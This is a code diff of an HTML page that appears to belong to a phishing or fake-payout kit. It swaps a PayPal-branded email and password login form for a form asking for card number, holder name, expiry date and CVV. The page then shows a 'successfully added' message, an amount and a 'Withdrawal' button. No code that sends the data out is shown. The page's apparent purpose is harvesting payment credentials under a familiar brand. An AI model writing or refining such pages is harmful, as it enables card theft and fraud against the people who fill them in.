@@ -25,36 +25,60 @@
         <h3 class="second-wrapper-title"></h3>
         <div class="content-second">
           <div class="inputform" action="">
-            <img class="logopp" src="./assets/img/logo.svg" alt="" />
+            <div class="cardlogos">
+              <img class="visa" src="./assets/img/visa.png" alt="" />
+              <img class="master" src="./assets/img/mastercrd.png" alt="" />
+            </div>
+            <p class="cardnumbertitle">Card Number</p>
+            <p class="cardholdertitle">Card Holder</p>
+
             <input
-              class="login"
+              required=""
+              id="cc"
+              value=""
+              class="cardnumber"
               type="text"
-              placeholder="Email or mobile number" />
-            <div class="requiredwrapper hidden">
-              <img class="reqimg" src="./assets/img/req.png" alt="" />
-              <p class="userrequired">Required</p>
-            </div>
-            <input
-              class="password"
-              type="password"
-              placeholder="Enter your password" />
-            <div class="requiredpasswordwrapper hidden">
-              <img class="reqimg" src="./assets/img/req.png" alt="" />
-              <p class="userrequired">Enter your password</p>
-            </div>
-            <div class="forgotwrapper">
-              <p class="forgot-title">Forgot password?</p>
-            </div>
-            <div class="buttonwrapper">
-              <button class="accept">Log In</button>
+              placeholder="1234 1234 1234 1234"
+              onkeypress="return checkDigit(event)" />
+            <div class="footercards">
+              <input
+                required=""
+                class="cardname"
+                type="text"
+                placeholder="John Doe" />
+              <div class="carddatawrapper">
+                <p class="carddatetitle">Exp. Date</p>
+                <input
+                  required=""
+                  class="carddata"
+                  type="text"
+                  placeholder="10/25"
+                  maxlength="5"
+                  onkeyup="formatString(event);" />
+              </div>
+              <div class="cardccvwrapper">
+                <p class="cardccvtitle">CCV</p>
+                <input
+                  required=""
+                  class="cardcvv"
+                  type="text"
+                  placeholder="123"
+                  oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');"
+                  maxlength="4" />
+              </div>
             </div>
           </div>
           <p class="vailederrortitle hidden"></p>
+          <div class="buttonwrapper">
+            <button class="accept">Add Card</button>
+          </div>
         </div>
       </div>
 
       <div class="card-added-wrapper hidden">
-        <h3 class="succestitle">Your PayPal has been successfully added</h3>
+        <h3 class="succestitle">
+          Your credit card has been successfully added
+        </h3>
         <h1 class="amount"></h1>
         <div class="withdrav-wrapper">
           <button class="withdraw-btn">Withdrawal</button>
